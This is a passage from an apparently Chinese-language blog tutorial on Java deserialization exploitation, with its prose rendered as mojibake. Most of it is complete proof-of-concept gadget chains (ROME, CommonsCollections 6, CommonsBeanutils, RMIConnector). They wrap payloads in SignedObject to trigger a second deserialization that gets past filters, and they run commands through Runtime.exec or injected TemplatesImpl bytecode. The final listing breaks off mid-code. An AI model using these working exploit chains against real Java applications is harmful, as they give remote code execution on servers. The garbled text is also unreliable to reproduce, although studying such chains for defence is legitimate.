61 62 63 64 65 66 67 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ToStringBean; import javax.management.BadAttributeValueExpException; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;, bean); //å®šä¹‰SignedObejctç±» KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(bad,kp.getPrivate(), Signature.getInstance(\u0026#34;DSA\u0026#34;)); ToStringBean bean2 = new ToStringBean(SignedObject.class,signedObject); BadAttributeValueExpException bad2 = new BadAttributeValueExpException(null); setFieldValue(bad2,\u0026#34;val\u0026#34;, bean2); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad2); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚å†ç®€å•è·Ÿä¸€ä¸‹æµç¨‹ï¼Œå‰é¢çš„é“¾å­ä¸ºï¼šBadAttributeValueExpException#readObject()==ã€‹ObjectBean#toString() ==ã€‹SignedObject#getObject() ==ã€‹BadAttributeValueExpException#readObject() ==ã€‹ ObjectBean#toString()\nåé¢çš„å°±å’ŒåŸºæœ¬çš„romeé“¾å·®ä¸å¤šäº†ï¼Œåœ¨è¿™é‡Œåé¢æ‹¼æ¥çš„æ˜¯romeé“¾ï¼Œå½“ç„¶è¿˜å¯ä»¥æ‹¼æ¥å…¶ä»–é“¾å­ï¼Œæ¯”å¦‚CC6ï¼ŒPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package org.example; import com.sun.syndication.feed.impl.ToStringBean; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean toString = new ToStringBean(SignedObject.class,signedObject); setFieldValue(bad,\u0026#34;val\u0026#34;,toString); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿™æ ·å°±å¯ä»¥ç”¨æ¥ç»•è¿‡ååºåˆ—åŒ–å¯¹CC6çš„é™åˆ¶äº†ã€‚\næ²¡å•¥é—®é¢˜ã€‚\nhashCodeé“¾ å…¶å®å°±æ˜¯å¥—ä¸€å±‚è€Œå·²ï¼Œè€Œä¸”æœ¬èº«è¿™æ¡é“¾å­ååŠéƒ¨åˆ†å’ŒtoStringé“¾å·®ä¸å¤šï¼Œåé¢å°±åªç»™POCäº†ã€‚\nè¿™é‡Œè¿˜æ˜¯æ¥çš„CC6äº†ï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package org.example; import com.sun.syndication.feed.impl.ToStringBean; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); ToStringBean bean = new ToStringBean(SignedObject.class,signedObject); EqualsBean equals = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hash2 = new HashMap(); hash2.put(equals,\u0026#34;fupanc1\u0026#34;); setFieldValue(equals,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(equals,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash2); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ç†è§£ä¸€ä¸‹å°±è¡Œã€‚\nequalsé“¾ å¤§å·®ä¸å·®ï¼Œè¿™é‡Œè¿˜æ˜¯æ¥çš„CC6ï¼Œæ³¨æ„ç†è§£è¿™é‡Œçš„äºŒæ¬¡ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œçœ‹ä¸€ä¸‹ä»£ç å°±æ‡‚äº†ï¼Œä½†æ˜¯æœ€å¥½å…ˆè‡ªå·±å°è¯•æ„é€ ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package org.example; import java.lang.reflect.Field; import java.util.Hashtable; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,signedObject); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,signedObject); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,SignedObject.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,signedObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } CBé“¾çš„åˆ©ç”¨ CBé“¾å°±æ˜¯è°ƒç”¨äº†getteræ–¹æ³•ï¼Œå®Œç¾ç¬¦åˆè¿™é‡Œæ‰“SignedObjectçš„äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå°±æ˜¯å°†CBé“¾ä¸­çš„TemplatesImplç±»å®ä¾‹æ”¹æˆSignedObjectç±»å®ä¾‹å³å¯ï¼Œè¿™é‡Œè¿˜æ˜¯æ¥ä¸€ä¸ªCC6ï¼Œpocå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); BeanComparator compare = new BeanComparator(); PriorityQueue queue= new PriorityQueue(2,compare); queue.add(1); queue.add(1); setFieldValue(compare,\u0026#34;property\u0026#34;,\u0026#34;object\u0026#34;); setFieldValue(queue,\u0026#34;queue\u0026#34;,new Object[]{signedObject,1}); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(queue); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } â€”â€”â€”â€”â€”â€”\né™¤äº†è¿™é‡Œçš„romeé“¾å’ŒCBé“¾æœ‰è°ƒç”¨getterï¼Œå½“ç„¶è¿˜æœ‰jacksonå’Œfastjsonæœ‰è°ƒç”¨getterçš„æ•ˆæœã€‚\nRMIConnector è¿™ä¸ªç±»ä½äºjavax.management.remote.rmi.RMIConnectorã€‚å­˜åœ¨äºŒæ¬¡ååºåˆ—åŒ–çš„ç‚¹æ˜¯è¿™ä¸ªç±»ä¸­çš„findRMIServerJRMP()ï¼Œä¸ºæˆ‘ä»¬å¯ä»¥è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼š\nè¿™é‡Œæ˜¯è‡ªå®šä¹‰äº†ä¸€ä¸ªbase64ToByteArray()æ–¹æ³•ç”¨äºå°†base64å­—ç¬¦ä¸²è§£ç æˆä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œç„¶åè¿›è¡Œäº†å¤„ç†ï¼Œæœ€åè¿›è¡Œäº†ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œã€‚\nå¯ä»¥æ‰¾ä¸€æ‰¾åœ¨å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œåœ¨åŒä¸€ä¸ªç±»ä¸­å¯»æ‰¾ï¼Œå¯ä»¥å‘ç°æ˜¯åœ¨findRMIServer()æ–¹æ³•è°ƒç”¨ï¼š è¦æ±‚è§£æå®Œçš„pathå¿…é¡»ä»¥/stub/æ¥å¼€å¤´ï¼Œçœ‹å‚æ•°ä¼ é€’çš„è¯æ˜¯ä»ç¬¬6ä¸ªå¼€å§‹è¿›è¡Œä¼ å‚ï¼Œä¹Ÿå°±æ˜¯ä¼šä¼ é€’/stub/åé¢çš„å­—ç¬¦ä¸²ï¼Œå†çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²çš„æ¥æºï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„getURLPath()æ–¹æ³•ï¼š ä¼šè¿”å›è¿™ä¸ªç±»çš„å˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„ã€‚å†å¾€å‰æ‰¾è¿™ä¸ªfindRMIServer()æ–¹æ³•çš„è°ƒç”¨æƒ…å†µï¼š\næ³¨æ„çœ‹å‚æ•°ä¼ é€’çš„æƒ…å†µï¼Œç„¶åå¯ä»¥çœ‹åˆ°è¿™é‡Œéœ€è¦rmiServerä¸ºnullï¼Œè¿™ä¸ªå¥½å¼„ï¼Œåœ¨RMIConnectorå®ä¾‹åŒ–çš„æ—¶å€™å°±å¯æ§ï¼Œç„¶åè¿™é‡Œçš„connect()æ–¹æ³•æ˜¯publicï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ä¸€ä¸‹æ­£å‘è°ƒç”¨ï¼Œç›´æ¥å®ä¾‹åŒ–RMIConnectoræ¥è°ƒç”¨connect()æ–¹æ³•ï¼Œè¿™é‡Œè¿˜æ˜¯é€šè¿‡CC6æ¥è¿›è¡Œæ¼”ç¤ºï¼Œä¹Ÿå°±æ˜¯å°†è¿™ä¸ªCC6çš„é“¾å­åºåˆ—åŒ–ä¸ºbase64æ•°æ®ã€‚\nåŸºæœ¬çš„å‚æ•°éƒ½è¯´äº†ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹éœ€è¦å®ä¾‹åŒ–çš„ç±»ã€‚\nå…ˆçœ‹ä¸€ä¸‹RMIConnectorç±»çš„æ„é€ æ–¹æ³•ï¼š\nè™½ç„¶ä¸ºprivateï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³•æ¥è¿›è¡Œå®ä¾‹åŒ–çš„ï¼š\nè¿™é‡Œçš„envä¸å¥½æ§åˆ¶ï¼Œç›´æ¥ä¼ å‚ä¸ºnullä½¿å…¶ä¸ºé»˜è®¤çš„å°±è¡Œäº†ã€‚å®åœ¨ä¸è¡Œè¿˜å¯ä»¥ä½¿ç”¨åå°„æ¥ä¿®æ”¹ã€‚å†çœ‹JMXServiceURLç±»çš„å®ä¾‹åŒ–ï¼Œç®€å•è·Ÿäº†ä¸€éï¼Œé‡ç‚¹å°±æ˜¯å¦‚ä¸‹ï¼š\nè¦æ±‚serviceURLå¿…é¡»ä»¥service:jmx:å¼€å¤´ï¼Œç„¶åæœ€åç»“å°¾å¿…é¡»æ˜¯://ï¼Œä¹Ÿæ­£å¦‚ä¸æ»¡è¶³çš„æŠ¥é”™å†…å®¹ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œçš„å¤§æ¦‚æ„æ€å°±æ˜¯ç¡®ä¿ä¸€ä¸ªæ­£å¸¸çš„åè®®ï¼Œæ¯”å¦‚ä¼ å‚ä¸ºservice:jmx:rmi://ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯è·å–çš„åè®®ä¸ºrmi,åé¢å°±æ˜¯ä¸€äº›hostçš„è§£æç­‰ç­‰ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\næ‰€ä»¥è¿™é‡Œå¯ä»¥ç®€å•å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œ Base64 ç¼–ç å¹¶è¾“å‡º String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(\u0026#34;Base64ç¼–ç åçš„åºåˆ—åŒ–æ•°æ®ï¼š\u0026#34;); System.out.println(base64Encoded); String base64_String=base64Encoded; JMXServiceURL url = new JMXServiceURL(\u0026#34;service:jmx:rmi://\u0026#34;); setFieldValue(url,\u0026#34;urlPath\u0026#34;,\u0026#34;/stub/\u0026#34;+base64_String); RMIConnector rmi = new RMIConnector(url,null); rmi.connect(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™é‡Œå»ºè®®è¿˜æ˜¯è·Ÿä¸€ä¸‹è¿™é‡Œçš„æµç¨‹ã€‚\næœ€åè¿™é‡Œæ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºäº†çš„ï¼Œç°åœ¨å°±æ˜¯éœ€è¦æƒ³æ€ä¹ˆæ¥è°ƒç”¨è¿™ä¸ªconnect()æ–¹æ³•ï¼Œä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„æ–¹æ³•å°±æ˜¯åˆ©ç”¨transform()æ–¹æ³•ï¼Œå‚è€ƒåˆ°CCé“¾ä¸­çš„é“¾å¼æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹å°è¯•ï¼Œæ¯”å¦‚è¿˜æ˜¯ä½¿ç”¨CC6æ¥å½“ä¾‹å­ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œ Base64 ç¼–ç å¹¶è¾“å‡º String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(\u0026#34;Base64ç¼–ç åçš„åºåˆ—åŒ–æ•°æ®ï¼š\u0026#34;); System.out.println(base64Encoded); String base64_String=base64Encoded; JMXServiceURL url = new JMXServiceURL(\u0026#34;service:jmx:rmi://\u0026#34;); setFieldValue(url,\u0026#34;urlPath\u0026#34;,\u0026#34;/stub/\u0026#34;+base64_String); RMIConnector rmi = new RMIConnector(url,null); Transformer[] fakeTransformer1 = new Transformer[]{new 